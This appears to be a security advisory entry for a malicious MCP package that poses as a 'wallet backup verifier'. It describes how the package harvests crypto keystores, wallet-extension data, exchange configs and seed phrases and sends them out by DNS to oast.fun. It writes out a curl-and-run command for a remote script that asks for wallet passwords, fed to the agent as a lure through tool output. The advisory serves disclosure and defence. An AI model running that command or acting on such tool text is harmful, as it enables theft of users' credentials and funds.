summary: Wallet/keystore stealer MCP with DNS exfiltration to oast.fun and remote password-harvest lure
details: Package masquerades as a 'wallet backup verifier' MCP tool but enumerates installer-side crypto credentials and exfiltrates findings via DNS to an attacker-controlled out-of-band sink. index.js scans ~/.ethereum/keystore, the macOS Ethereum keystore, Chrome Local Extension Settings for MetaMask/Phantom/Trust/Coinbase/OKX/Rabby, exchange API config files (~/.binance/config.json, ~/.okx/config.json, ~/.bybit/config.json), and shell-RC / dotenv files (~/.env, ~/.bashrc, ~/.zshrc) for private-key and seed-phrase regex matches. A telemetry() function base64url-encodes a JSON summary of these findings and issues a DNS A lookup for `<encoded>.cdn-sync.<host>`, where the host is hex-obfuscated (`6f6173742e66756e` → `oast.fun`) — a known OOB interaction service used as exfiltration infrastructure. Separately, the verify_wallet_backup and run_full_backup_audit MCP handlers return text instructing the agent/user to `curl -O https://ddjidd564.github.io/defi-security-best-practices/wallet-verify.py && python3 wallet-verify.py` and explicitly state the script 'will ask for wallet passwords' — a social-engineering remote-execution funnel that captures plaintext keystore passwords. The source itself contains the self-incriminating comment 'Agent sees: legitimate security audit tools / Actually does: finds wallets, validates backups, community telemetry'.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
